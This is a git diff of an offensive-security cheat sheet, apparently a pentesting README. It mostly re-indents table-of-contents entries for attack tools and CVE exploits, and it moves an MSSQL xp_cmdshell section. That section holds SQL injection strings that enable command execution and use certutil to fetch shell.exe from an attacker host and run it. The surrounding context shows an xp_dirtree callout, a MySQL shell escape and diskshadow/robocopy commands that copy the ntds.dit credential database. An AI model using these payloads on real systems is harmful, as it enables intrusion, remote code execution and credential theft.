@@ -108,14 +108,14 @@ Thank you for reading.
 	- [Password Attacks](#password-attacks-1)
 		- [CrackMapExec](#crackmapexec)
 		- [fcrack](#fcrack)
-  		- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
+    		- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
 		- [hashcat](#hashcat)
 		- [Hydra](#hydra)
 		- [John](#john)
 		- [Kerbrute](#kerbrute)
 		- [LaZagne](#lazagne)
 		- [mimikatz](#mimikatz)
-  		- [NetExec](#NetExec)
+    		- [NetExec](#NetExec)
 		- [pypykatz](#pypykatz)
 	- [Exploitation Tools](#exploitation-tools-1)
 		- [Metasploit](#metasploit)
@@ -123,10 +123,10 @@ Thank you for reading.
  		- [Abusing Account Operators Group Membership](#abusing-account-operators-group-membership)
  		- [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
 		- [ADCSTemplate](#adcstemplate)
-  		- [ADMiner](#adminer)
+    		- [ADMiner](#adminer)
 		- [BloodHound](#bloodhound)
 		- [BloodHound Python](#bloodhound-python)
-  		- [bloodyAD](#bloodyAD)
+    		- [bloodyAD](#bloodyAD)
 		- [Certify](#certify)
 		- [Certipy](#certipy)
 		- [enum4linux-ng](#enum4linux-ng)
@@ -143,7 +143,7 @@ Thank you for reading.
 		- [powercat](#powercat)
 		- [Powermad](#powermad)
 		- [PowerShell](#powershell)
-  		- [PrivescCheck](#privesccheck)
+    		- [PrivescCheck](#privesccheck)
 		- [pwncat](#pwncat)
 		- [rpcclient](#rpcclient)
 		- [Rubeus](#rubeus)
@@ -163,13 +163,13 @@ Thank you for reading.
 		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
 		- [CVE-2023-22809: Sudo Bypass](#cve-2023-22809-sudo-bypass)
 		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
-  		- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
-   		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
-  		- [GodPotato LPE](#godpotato-lpe)
+    		- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
+      		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
+    		- [GodPotato LPE](#godpotato-lpe)
 		- [Juicy Potato LPE](#juicy-potato-lpe)
-  		- [JuicyPotatoNG LPE](#juicypotatong-lpe)
+    		- [JuicyPotatoNG LPE](#juicypotatong-lpe)
 		- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
-  		- [PrintSpoofer LPE](#printspoofer-lpe)
+    		- [PrintSpoofer LPE](#printspoofer-lpe)
 		- [SharpEfsPotato LPE](#sharpefspotato-lpe)
 		- [Shocker Container Escape](#shocker-container-escape)
 	- [Payloads](#payloads-1)
@@ -1981,6 +1981,30 @@ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
 ```
 
+##### xp_cmdshell
+
+```c
+SQL> EXEC sp_configure 'Show Advanced Options', 1;
+SQL> reconfigure;
+SQL> sp_configure;
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> reconfigure
+SQL> xp_cmdshell "whoami"
+```
+
+```c
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+
+```c
+';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
+';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
+';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
+```
+
+
+
 #### MySQL
 
 ```c
@@ -2008,28 +2032,6 @@ mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_
 
 ```c
 mysql> \! /bin/sh
-```
-
-##### xp_cmdshell
-
-```c
-SQL> EXEC sp_configure 'Show Advanced Options', 1;
-SQL> reconfigure;
-SQL> sp_configure;
-SQL> EXEC sp_configure 'xp_cmdshell', 1;
-SQL> reconfigure
-SQL> xp_cmdshell "whoami"
-```
-
-```c
-SQL> enable_xp_cmdshell
-SQL> xp_cmdshell whoami
-```
-
-```c
-';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
-';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
-';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
 ```
 
 ##### Insert Code to get executed
@@ -4057,7 +4059,7 @@ createX
 expose %cdrive% E:X
 end backupX
 ```
- 
+
 ```c
 diskshadow /s script.txt
 robocopy /b E:\Windows\ntds . ntds.dit
